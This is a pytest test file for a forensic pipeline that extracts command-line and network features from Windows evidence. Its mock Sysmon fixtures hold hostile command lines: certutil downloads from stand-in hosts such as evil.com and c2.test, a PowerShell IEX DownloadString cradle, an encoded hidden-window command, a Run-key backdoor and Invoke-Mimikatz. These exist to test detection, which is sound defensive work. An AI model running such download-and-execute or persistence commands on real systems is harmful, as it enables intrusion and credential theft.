"""Tests for Track B Command and Network Forensic Extraction (Tasks B1 & B2)."""

from __future__ import annotations

import json
from pathlib import Path

from forensics.command.command_extractor import (
    extract_command_features,
    is_background_process,
    is_harness_command,
    is_powershell_module_init,
    is_telemetry_script,
)
from forensics.extraction.pipeline import run_track_b_extraction
from forensics.network.network_extractor import (
    extract_network_features,
)
from forensics.schemas.command import CommandFeatures
from forensics.schemas.network import NetworkFeatures

# ==============================================================================
# Network Extraction Tests
# ==============================================================================


def test_network_extractor_benign_evidence(tmp_path: Path) -> None:
    """Verify network extraction with the actual observed benign evidence format."""
    # Actual observed network_connections.csv header and records from FMD-Windows
    csv_content = (
        '"LocalAddress","LocalPort","RemoteAddress","RemotePort","State","OwningProcess"\n'
        '"::","49669","::","0","Listen","808"\n'
        '"::","49668","::","0","Listen","2900"\n'
        '"::","49667","::","0","Listen","716"\n'
        '"::","445","::","0","Listen","4"\n'
        '"::","135","::","0","Listen","532"\n'
        '"0.0.0.0","49669","0.0.0.0","0","Listen","808"\n'
        '"0.0.0.0","5040","0.0.0.0","0","Listen","5024"\n'
        '"192.168.100.20","139","0.0.0.0","0","Listen","4"\n'
        '"0.0.0.0","135","0.0.0.0","0","Listen","532"\n'
    )
    net_csv = tmp_path / "network_connections.csv"
    net_csv.write_text(csv_content, encoding="utf-8")

    features = extract_network_features(tmp_path, sample_id="EXEC_RUN-1100")

    assert features.sample_id == "EXEC_RUN-1100"
    assert features.active_connection_count == 0
    # Distinct listening ports: 49669, 49668, 49667, 445, 135, 5040, 139 -> 7 unique
    assert features.listening_port_count == 7
    assert features.outbound_connection_count == 0
    assert features.unique_remote_ips == 0
    assert features.suspicious_port_usage == 0

    # Null semantics verification: unsupported PCAP/Sysmon metrics must be null
    assert features.dns_query_count is None
    assert features.avg_interpacket_interval_ms is None
    assert features.beacon_regularity_score is None
    assert features.total_bytes_sent is None
    assert features.total_bytes_received is None

    # Check JSON serialization contains genuine nulls without fabrication
    dumped = json.loads(features.model_dump_json())
    assert dumped["dns_query_count"] is None
    assert dumped["avg_interpacket_interval_ms"] is None
    assert dumped["beacon_regularity_score"] is None
    assert dumped["total_bytes_sent"] is None
    assert dumped["total_bytes_received"] is None


def test_network_extractor_malicious_c2_connection(tmp_path: Path) -> None:
    """Verify network extraction when suspicious C2 connections are present."""
    csv_content = (
        "LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess\n"
        "192.168.100.20,49812,192.168.100.10,4444,Established,3820\n"
        "192.168.100.20,49813,10.0.0.5,8080,SynSent,3820\n"
        "0.0.0.0,135,0.0.0.0,0,Listen,532\n"
    )
    net_csv = tmp_path / "network_connections.csv"
    net_csv.write_text(csv_content, encoding="utf-8")

    features = extract_network_features(tmp_path, sample_id="EXEC_RUN-001")

    assert features.sample_id == "EXEC_RUN-001"
    assert features.active_connection_count == 2
    assert features.listening_port_count == 1
    assert features.outbound_connection_count == 2
    assert features.unique_remote_ips == 2
    # Ports 4444 and 8080 are in SUSPICIOUS_PORTS
    assert features.suspicious_port_usage == 1


def test_network_extractor_empty_directory(tmp_path: Path) -> None:
    """Verify network extraction returns clean baseline when no CSV is present."""
    features = extract_network_features(tmp_path, sample_id="EXEC_EMPTY")
    assert features.active_connection_count == 0
    assert features.listening_port_count == 0
    assert features.outbound_connection_count == 0
    assert features.unique_remote_ips == 0
    assert features.suspicious_port_usage == 0
    assert features.dns_query_count is None


# ==============================================================================
# Command Extraction Tests
# ==============================================================================


def test_powershell_module_init_not_flagged() -> None:
    """Verify normal PowerShell module initialization blocks are not flagged as malicious."""
    normal_inits = [
        "try { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }",
        "#requires -version 3.0\n[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'test'}",
        "function prompt { 'PS ' + (Get-Location) + '> ' }",
        "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally",
        "Microsoft.PowerShell.Security\\Export-ModuleMember -Function 'Get-ExecutionPolicy'",
    ]
    for script in normal_inits:
        assert is_powershell_module_init(script) is True, f"Failed for: {script}"


def test_harness_command_filtering() -> None:
    """Verify A6 collection harness commands are filtered out."""
    harness_commands = [
        'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\FMD-Collector\\tools\\collect_run_windows.ps1"',
        'cmd.exe /c "C:\\FMD-Windows-Collector\\tools\\collect_run_windows.bat"',
        "C:\\Tools\\DumpIt.exe /QUIET /O memory.raw",
        "python tools/collection_orchestrator.py --run-id RUN-001",
        "hash-evidence --dir C:\\RUN-001",
        "wevtutil.exe cl Microsoft-Windows-Sysmon/Operational",
        "scp.exe -i key evidence.tar.gz user@remote:/path",
        "ssh.exe -i key user@remote 'exit'",
        'py -3 -c "import sys; sys.exit(0)"',
        "Get-NetTCPConnection | Select-Object -First 10",
        "Get-Process | Export-Csv process_snapshot.csv",
    ]
    for cmd in harness_commands:
        assert is_harness_command(cmd) is True, f"Harness not detected: {cmd}"


def test_powershell_module_init_expanded_patterns() -> None:
    """Verify built-in CDXML, parameter sets, and module export noise are filtered."""
    noisy_scripts = [
        "$__cmdletization_associatednetfirewall = 1",
        "param ( [ParameterSetName='ByName'] [string]$Name )",
        "Microsoft.PowerShell.Core\\Export-ModuleMember -Alias '*'",
        "Export-ModuleMember -Function 'Get-NetIPAddress'",
        "Get-NetTCPSetting -DeadGatewayDetection Enabled",
        "[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'chimney'}",
    ]
    for script in noisy_scripts:
        assert is_powershell_module_init(script) is True, f"PowerShell noise not caught: {script}"


def test_background_process_noise_filtering() -> None:
    """Verify OS background noise binaries are identified while workloads are preserved."""
    noise_binaries = [
        r'"C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-test',
        r"C:\Windows\System32\SearchIndexer.exe /Embedding",
        r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --field-trial-handle=1',
        r"C:\Windows\System32\compattelrunner.exe -maintenance",
        r"C:\Windows\System32\RuntimeBroker.exe -Embedding",
    ]
    for cmd in noise_binaries:
        assert is_background_process(cmd) is True, f"Noise not identified: {cmd}"

    workload_commands = [
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -command whoami",
        r"cmd.exe /c echo hello",
        r"certutil.exe -urlcache -split -f http://evil.test payload.exe",
        r"rundll32.exe C:\Users\fmd\AppData\Local\Temp\evil.dll,Start",
        r"C:\Users\fmd\Desktop\malware.exe",
    ]
    for cmd in workload_commands:
        assert is_background_process(cmd) is False, f"Workload falsely flagged as noise: {cmd}"


def test_telemetry_script_filtering() -> None:
    """Verify CompatTelRunner telemetry invocations are identified."""
    assert (
        is_telemetry_script(
            cmd='powershell.exe -ExecutionPolicy Restricted -Command "$Res = 0; $Infs = Get-Item..."',
            parent=r"C:\Windows\System32\CompatTelRunner.exe",
        )
        is True
    )
    assert (
        is_telemetry_script(
            cmd="powershell.exe -Command Write-Host 'Final Result: Success'",
            parent="",
        )
        is True
    )
    assert (
        is_telemetry_script(
            cmd="powershell.exe -ExecutionPolicy Bypass -Command Invoke-Mimikatz",
            parent="cmd.exe",
        )
        is False
    )


def test_command_extractor_benign_snapshot_and_xml(tmp_path: Path) -> None:
    """Verify command extraction on benign evidence produces zero attack flags."""
    proc_csv = tmp_path / "process_snapshot.csv"
    proc_csv.write_text(
        '"Id","ProcessName","Path","StartTime","CPU","WorkingSet64"\n'
        '"4556","AggregatorHost","C:\\WINDOWS\\System32\\AggregatorHost.exe","19-09-2026 14:01:27","0.5","11919360"\n'
        '"7624","SearchProtocolHost","C:\\WINDOWS\\system32\\SearchProtocolHost.exe","19-09-2026 14:02:42","0.0625","8581120"\n',
        encoding="utf-8",
    )

    features = extract_command_features(tmp_path, sample_id="EXEC_RUN-1100")

    assert features.sample_id == "EXEC_RUN-1100"
    assert features.is_base64_encoded == 0
    assert features.has_download_cradle == 0
    assert features.has_bypass_execution_policy == 0
    assert features.has_hidden_window == 0
    assert features.uses_lolbins == 0
    assert features.registry_persistence_count == 0
    assert features.shannon_entropy >= 0.0
    assert features.command_length > 0


def test_command_extractor_malicious_indicators(tmp_path: Path) -> None:
    """Verify command extraction correctly detects attack patterns in mock evidence."""
    # Write mock Sysmon XML containing suspicious commands
    sysmon_xml = tmp_path / "sysmon_events.xml"
    sysmon_xml.write_text(
        """<Events>
          <Event>
            <System><EventID>1</EventID></System>
            <EventData>
              <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SUVYIChOZXctT2JqZWN0</Data>
            </EventData>
          </Event>
          <Event>
            <System><EventID>1</EventID></System>
            <EventData>
              <Data Name="CommandLine">certutil.exe -urlcache -split -f http://c2.test/file.bin payload.exe</Data>
            </EventData>
          </Event>
          <Event>
            <System><EventID>13</EventID></System>
            <EventData>
              <Data Name="TargetObject">HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor</Data>
            </EventData>
          </Event>
        </Events>""",
        encoding="utf-8",
    )

    features = extract_command_features(tmp_path, sample_id="EXEC_RUN-MAL-01")

    assert features.sample_id == "EXEC_RUN-MAL-01"
    assert features.has_bypass_execution_policy == 1
    assert features.has_hidden_window == 1
    assert features.has_download_cradle == 1
    assert features.uses_lolbins == 1
    assert features.is_base64_encoded == 1
    assert features.registry_persistence_count >= 1
    assert features.shannon_entropy > 3.0


def test_genuine_workload_selected_over_searchprotocolhost(tmp_path: Path) -> None:
    """Verify high-entropy SearchProtocolHost background noise is excluded in favor of genuine workload."""
    sysmon_xml = tmp_path / "sysmon_events.xml"
    # SearchProtocolHost 405-char command that previously contaminated all 45 samples
    sph_noise = (
        r'"C:\WINDOWS\system32\SearchProtocolHost.exe" '
        r"Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-3965584501-1376662706-2580718586-10001_ "
        r"Global\UsGthrFltPermPipeMssGthrPipe_S-1-5-21-3965584501-1376662706-2580718586-10001 "
        r"1 3 \"HKLM\SOFTWARE\Microsoft\Windows Search\" \"AppData\LocalLow\Microsoft\Search\Data\Applications\Windows\""
    )
    workload_cmd = r'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.100.10/payload.ps1\')"'

    sysmon_xml.write_text(
        f"""<Events>
          <Event>
            <System><EventID>1</EventID></System>
            <EventData>
              <Data Name="CommandLine">{sph_noise}</Data>
              <Data Name="Image">C:\\WINDOWS\\system32\\SearchProtocolHost.exe</Data>
            </EventData>
          </Event>
          <Event>
            <System><EventID>1</EventID></System>
            <EventData>
              <Data Name="CommandLine">wevtutil.exe cl Microsoft-Windows-Sysmon/Operational</Data>
              <Data Name="Image">C:\\Windows\\System32\\wevtutil.exe</Data>
            </EventData>
          </Event>
          <Event>
            <System><EventID>1</EventID></System>
            <EventData>
              <Data Name="CommandLine">{workload_cmd}</Data>
              <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
            </EventData>
          </Event>
        </Events>""",
        encoding="utf-8",
    )

    features = extract_command_features(tmp_path, sample_id="EXEC_RUN-SPH-TEST")

    # The extractor MUST pick the genuine PowerShell workload, NOT SearchProtocolHost or wevtutil
    assert "SearchProtocolHost" not in features.raw_command_text
    assert "wevtutil" not in features.raw_command_text
    assert "DownloadString" in features.raw_command_text
    assert features.command_length == len(workload_cmd)
    assert features.has_download_cradle == 1
    assert features.has_bypass_execution_policy == 1


def test_different_workloads_produce_distinct_commands_and_features(tmp_path: Path) -> None:
    """Verify distinct sample workloads produce different text, lengths, entropy, and feature flags."""
    sample_a_dir = tmp_path / "sample_a"
    sample_b_dir = tmp_path / "sample_b"
    sample_c_dir = tmp_path / "sample_c"
    sample_a_dir.mkdir()
    sample_b_dir.mkdir()
    sample_c_dir.mkdir()

    # Workload A: Base64 encoded hidden execution
    (sample_a_dir / "sysmon.xml").write_text(
        """<Events><Event><System><EventID>1</EventID></System><EventData>
        <Data Name="CommandLine">powershell.exe -WindowStyle Hidden -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp</Data>
        <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
        </EventData></Event></Events>""",
        encoding="utf-8",
    )

    # Workload B: LOLBin certutil download
    (sample_b_dir / "sysmon.xml").write_text(
        """<Events><Event><System><EventID>1</EventID></System><EventData>
        <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\temp\\b.exe</Data>
        <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
        </EventData></Event></Events>""",
        encoding="utf-8",
    )

    # Workload C: Reconnaissance whoami command
    (sample_c_dir / "sysmon.xml").write_text(
        """<Events><Event><System><EventID>1</EventID></System><EventData>
        <Data Name="CommandLine">cmd.exe /c whoami /all</Data>
        <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
        </EventData></Event></Events>""",
        encoding="utf-8",
    )

    feat_a = extract_command_features(sample_a_dir, sample_id="EXEC_RUN-A")
    feat_b = extract_command_features(sample_b_dir, sample_id="EXEC_RUN-B")
    feat_c = extract_command_features(sample_c_dir, sample_id="EXEC_RUN-C")

    # Command texts must be distinct and non-empty
    assert feat_a.raw_command_text != feat_b.raw_command_text
    assert feat_b.raw_command_text != feat_c.raw_command_text
    assert feat_a.raw_command_text != feat_c.raw_command_text

    # Command lengths must reflect the actual commands
    assert feat_a.command_length != feat_b.command_length
    assert feat_b.command_length != feat_c.command_length

    # Entropy values must not be identical across distinct payloads
    assert feat_a.shannon_entropy != feat_c.shannon_entropy

    # Feature indicators must match their specific behaviors
    assert feat_a.is_base64_encoded == 1
    assert feat_a.has_hidden_window == 1
    assert feat_a.uses_lolbins == 0

    assert feat_b.uses_lolbins == 1
    assert feat_b.has_download_cradle == 1
    assert feat_b.is_base64_encoded == 0

    assert feat_c.is_base64_encoded == 0
    assert feat_c.uses_lolbins == 0
    assert feat_c.has_download_cradle == 0


# ==============================================================================
# Pipeline Integration Tests
# ==============================================================================


def test_run_track_b_extraction_pipeline(tmp_path: Path) -> None:
    """Verify run_track_b_extraction executes and persists interim JSON models."""
    evidence_dir = tmp_path / "evidence"
    interim_dir = tmp_path / "interim"
    evidence_dir.mkdir()

    # Populate sample evidence
    net_csv = evidence_dir / "network_connections.csv"
    net_csv.write_text(
        "LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess\n"
        "0.0.0.0,445,0.0.0.0,0,Listen,4\n",
        encoding="utf-8",
    )
    proc_csv = evidence_dir / "process_snapshot.csv"
    proc_csv.write_text(
        "Id,ProcessName,Path,StartTime,CPU,WorkingSet64\n"
        "100,svchost,C:\\Windows\\System32\\svchost.exe,19-09-2026,0.1,1024\n",
        encoding="utf-8",
    )

    res = run_track_b_extraction(
        input_dir=evidence_dir,
        sample_id="EXEC_PIPELINE_TEST",
        output_base_dir=interim_dir,
    )

    assert res.sample_id == "EXEC_PIPELINE_TEST"
    assert res.command_output_path.is_file()
    assert res.network_output_path.is_file()

    # Validate output files conform to schemas
    cmd_data = json.loads(res.command_output_path.read_text(encoding="utf-8"))
    net_data = json.loads(res.network_output_path.read_text(encoding="utf-8"))

    cmd_model = CommandFeatures(**cmd_data)
    net_model = NetworkFeatures(**net_data)

    assert cmd_model.sample_id == "EXEC_PIPELINE_TEST"
    assert net_model.sample_id == "EXEC_PIPELINE_TEST"
    assert net_model.listening_port_count == 1
    assert net_model.dns_query_count is None


def test_extract_from_archive_four_modalities(tmp_path: Path) -> None:
    """Verify extract_from_archive extracts and standardizes all 4 modalities."""
    import tarfile

    from tools.extract_custom_evidence import extract_from_archive

    archive_p = tmp_path / "test_batch.tar.gz"
    out_dir = tmp_path / "interim"

    # Create mock archive
    with tarfile.open(archive_p, "w:gz") as tf:
        # 1. source_evidence
        net_content = (
            b"LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess\n"
            b"0.0.0.0,445,0.0.0.0,0,Listen,4\n"
        )
        ti_net = tarfile.TarInfo(name="batch/source_evidence/RUN-100/network_connections.csv")
        ti_net.size = len(net_content)
        import io

        tf.addfile(ti_net, io.BytesIO(net_content))

        # 2. process json
        proc_content = json.dumps(
            {
                "sample_id": "RUN-100",
                "total_process_count": 10,
                "hidden_process_count": 0,
                "anomalous_ppid_count": 0,
                "avg_threads_per_process": 2.0,
                "max_threads_in_single_process": 4,
                "total_handle_count": 100,
                "suspicious_dll_count": 0,
                "malfind_process_count": 0,
                "elevated_privilege_count": 0,
                "unlinked_dll_count": 0,
            }
        ).encode("utf-8")
        ti_proc = tarfile.TarInfo(name="batch/process/RUN-100.json")
        ti_proc.size = len(proc_content)
        tf.addfile(ti_proc, io.BytesIO(proc_content))

        # 3. memory json
        mem_content = json.dumps(
            {
                "sample_id": "RUN-100",
                "rwx_page_count": 0,
                "injected_code_regions": 0,
                "unmapped_executable_pages": 0,
                "vad_protection_anomaly_count": 0,
                "ldrmodules_inconsistencies": 0,
                "yara_shellcode_matches": 0,
                "mean_memory_entropy": None,
                "max_memory_entropy": None,
            }
        ).encode("utf-8")
        ti_mem = tarfile.TarInfo(name="batch/memory/RUN-100.json")
        ti_mem.size = len(mem_content)
        tf.addfile(ti_mem, io.BytesIO(mem_content))

    res = extract_from_archive(archive_p, output_dir=out_dir)
    assert len(res) == 1
    sample_id, cmd_p, net_p, proc_p, mem_p = res[0]
    assert sample_id == "EXEC_RUN-100"
    assert cmd_p.is_file()
    assert net_p.is_file()
    assert proc_p is not None
    assert mem_p is not None
    assert proc_p.is_file()
    assert mem_p.is_file()

    # Verify standardized sample IDs inside JSON files
    with proc_p.open("r", encoding="utf-8") as f:
        assert json.load(f)["sample_id"] == "EXEC_RUN-100"
    with mem_p.open("r", encoding="utf-8") as f:
        assert json.load(f)["sample_id"] == "EXEC_RUN-100"
